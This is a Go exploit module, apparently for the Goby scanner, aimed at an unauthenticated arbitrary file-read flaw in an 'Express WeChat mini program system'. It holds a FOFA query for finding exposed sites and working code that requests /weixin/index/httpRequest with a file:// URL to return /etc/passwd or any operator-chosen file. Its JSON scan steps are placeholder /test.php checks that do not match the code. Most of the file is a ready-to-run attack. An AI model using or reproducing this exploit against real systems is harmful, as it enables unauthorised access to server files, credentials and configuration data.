package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Express WeChat applet system /weixin/index/httpRequest File Read Vulnerability",
    "Description": "<p>The express delivery WeChat mini program system is a lightweight application developed based on the WeChat platform. Users can directly use the mini program for express delivery operations within WeChat without needing to download additional apps. The system integrates multiple functions, realizing the whole chain of express delivery services from sending orders, tracking logistics to payment settlement, greatly improving the convenience and user experience </p>",
    "Product": "Express WeChat Mini Program System",
    "Homepage": "https://mp.weixin.qq.com/cgi-bin/wx",
    "DisclosureDate": "2024-10-31",
    "PostTime": "2024-11-01",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"static/default/newwap/lang\" && body=\"公众号\"",
    "GobyQuery": "body=\"static/default/newwap/lang\" && body=\"公众号\"",
    "Level": "1",
    "Impact": "<p>Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/DayPoc/article/details/143406666"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "快递微信小程序系统 /weixin/index/httpRequest 文件读取漏洞",
            "Product": "快递微信小程序系统",
            "Description": "<p>快递微信小程序系统是基于微信平台开发的轻量级应用，用户无需下载额外的APP，即可在微信内直接使用小程序进行快递操作。该系统集成了多项功能，实现了从寄件下单、物流跟踪到支付结算等全链条的快递服务，极大地提高了用户的便捷性和使用体验。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Express WeChat applet system /weixin/index/httpRequest File Read Vulnerability",
            "Product": "Express WeChat Mini Program System",
            "Description": "<p>The express delivery WeChat mini program system is a lightweight application developed based on the WeChat platform. Users can directly use the mini program for express delivery operations within WeChat without needing to download additional apps. The system integrates multiple functions, realizing the whole chain of express delivery services from sending orders, tracking logistics to payment settlement, greatly improving the convenience and user experience&nbsp;<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	postOrGet_zasqefasf123asdfafe1412afdawaq := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		getRequestConfig := httpclient.NewGetRequestConfig("/weixin/index/httpRequest?url=file://" + fileUrl)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/weixin/index/httpRequest?url=file:///etc/passwd"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
